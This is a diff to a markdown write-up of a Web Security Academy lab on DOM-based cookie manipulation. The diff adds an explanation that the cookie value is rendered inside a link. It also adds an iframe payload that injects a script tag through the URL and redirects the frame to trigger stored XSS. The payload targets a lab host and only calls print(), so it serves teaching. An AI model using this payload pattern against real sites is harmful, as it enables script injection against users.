@@ -104,7 +104,11 @@ Below is the snippet code we found in application home page while trying to view
   document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
 </script>
 ```
-This code is vulnerable to DOM-based Cookie Manipulation because it takes the entire, uncleaned URL directly from the address bar (window.location) and appends it straight into document.cookie. Many web applications read cookies later to customize the page user interface (e.g., displaying a username, language preference, or "last viewed item"). Below is the payload you can use to trigger DOM based XSS.
+Also the application uses the lastViewedProduct value and print it on UI using a hyperlink as shown below.
+```html
+<a href='https://0ae100a503d94923809d0300000500b4.web-security-academy.net/product?productId=1&'>Last viewed product</a>
+```
+This code is vulnerable to DOM-based Cookie Manipulation because it takes the entire, uncleaned URL directly from the address bar (window.location) and appends it straight into document.cookie. Many web applications read cookies later to customize the page user interface (e.g., displaying a username, language preference, or "last viewed item"). Below is the payload you can use to trigger DOM based XSS. We have crafter this payload depending upon how is getting rendered in <a> tag.
 ```html
 <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
 ```
